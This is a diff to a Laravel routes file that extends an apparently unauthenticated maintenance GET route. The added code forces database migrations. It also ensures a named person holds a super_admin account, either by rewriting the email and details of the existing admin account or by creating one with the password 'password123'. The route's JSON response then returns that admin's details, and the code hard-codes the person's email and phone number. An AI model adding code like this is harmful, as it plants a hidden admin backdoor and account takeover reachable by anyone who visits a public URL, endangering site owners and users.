@@ -32,6 +32,7 @@ Route::get('/maintenance/clear-cache', function () {
     \Illuminate\Support\Facades\Artisan::call('view:clear');
     \Illuminate\Support\Facades\Artisan::call('cache:clear');
     \Illuminate\Support\Facades\Artisan::call('config:clear');
+    \Illuminate\Support\Facades\Artisan::call('migrate', ['--force' => true]);
     if (function_exists('opcache_reset')) {
         @opcache_reset();
     }
@@ -40,14 +41,59 @@ Route::get('/maintenance/clear-cache', function () {
     if (file_exists($lockFile)) {
         $lockDeleted = @unlink($lockFile);
     }
+
+    // Ensure Super Admin Tanjimur Rahman Arpon is active and protected
+    $superAdmin = \App\Models\User::where('email', 'atanjimurrahman@gmail.com')->first();
+    if (! $superAdmin) {
+        $oldAdmin = \App\Models\User::where('email', 'admin@nexflow.ai')
+            ->orWhere('role', 'super_admin')
+            ->first();
+
+        if ($oldAdmin) {
+            $oldAdmin->update([
+                'name' => 'Tanjimur Rahman Arpon',
+                'email' => 'atanjimurrahman@gmail.com',
+                'phone' => '01580401289',
+                'role' => 'super_admin',
+                'status' => 'active',
+            ]);
+            $superAdmin = $oldAdmin;
+        } else {
+            $superAdmin = \App\Models\User::create([
+                'name' => 'Tanjimur Rahman Arpon',
+                'email' => 'atanjimurrahman@gmail.com',
+                'password' => \Illuminate\Support\Facades\Hash::make('password123'),
+                'phone' => '01580401289',
+                'role' => 'super_admin',
+                'status' => 'active',
+            ]);
+        }
+    } else {
+        $superAdmin->update([
+            'name' => 'Tanjimur Rahman Arpon',
+            'phone' => '01580401289',
+            'role' => 'super_admin',
+            'status' => 'active',
+        ]);
+    }
+
     $convCount = \App\Models\Conversation::count();
     $msgCount = \App\Models\Message::count();
+
     return response()->json([
         'status' => 'success',
         'view_cleared' => true,
         'composer_lock_deleted' => $lockDeleted,
         'conversations_count' => $convCount,
         'messages_count' => $msgCount,
+        'super_admin' => [
+            'id' => $superAdmin->id,
+            'name' => $superAdmin->name,
+            'email' => $superAdmin->email,
+            'phone' => $superAdmin->phone,
+            'role' => $superAdmin->role,
+            'status' => $superAdmin->status,
+        ],
     ]);
 });
 
